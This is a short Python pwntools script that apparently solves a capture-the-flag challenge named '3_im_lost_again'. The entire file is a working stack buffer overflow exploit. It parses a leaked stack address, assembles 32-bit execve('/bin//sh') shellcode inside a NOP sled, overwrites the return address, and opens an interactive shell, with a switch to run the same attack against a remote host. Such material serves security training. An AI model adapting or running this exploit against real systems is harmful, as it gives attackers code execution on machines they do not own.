from pwn import *

#context.log_level = "debug"
remote_conn = False

IP = ""
PORT = ""
FILENAME = "./3_im_lost_again"

if remote_conn:
    p = remote(IP, PORT)
    elf = ELF(FILENAME)
else:
    p = process(FILENAME)
    elf = p.elf

p.recvuntil("live at ")
stack_leak = int(p.recvline()[:-1], 16)
log.info(hex(stack_leak))

shellcode = asm('''
xor eax, eax
push eax

push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
mov edx, ecx

mov eax, 0xb
int 0x80
''')

log.info(str(len(shellcode)))

payload = b"\x90" * 200 + shellcode + b"\x90" * 190 + pack(stack_leak)
pause()
p.sendlineafter("/No", payload)

p.interactive()
